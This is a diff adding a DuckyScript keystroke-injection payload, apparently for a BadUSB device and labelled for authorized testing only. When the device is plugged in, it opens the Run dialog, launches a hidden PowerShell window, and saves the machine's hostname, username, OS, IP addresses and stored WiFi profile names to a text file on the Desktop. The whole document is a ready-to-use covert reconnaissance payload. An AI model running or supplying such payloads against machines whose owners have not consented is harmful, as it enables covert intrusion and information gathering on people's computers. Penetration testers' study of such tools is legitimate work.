@@ -1,0 +1,9 @@
+REM System Info Grabber - Collects basic system information into a text file
+REM Opens PowerShell and saves hostname, IP, and OS info to Desktop
+REM FOR AUTHORIZED TESTING ONLY on systems you own or have permission to test
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -Command "& { $info = @(); $info += 'Hostname: ' + $env:COMPUTERNAME; $info += 'Username: ' + $env:USERNAME; $info += 'OS: ' + (Get-CimInstance Win32_OperatingSystem).Caption; $info += 'IP Addresses:'; $info += (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -ExpandProperty IPAddress) -join ', '; $info += 'WiFi Profiles: ' + ((netsh wlan show profiles) -match 'All User Profile' -replace '.*: ','') -join ', '; $info | Out-File $env:USERPROFILE\Desktop\sysinfo.txt; }"
+ENTER
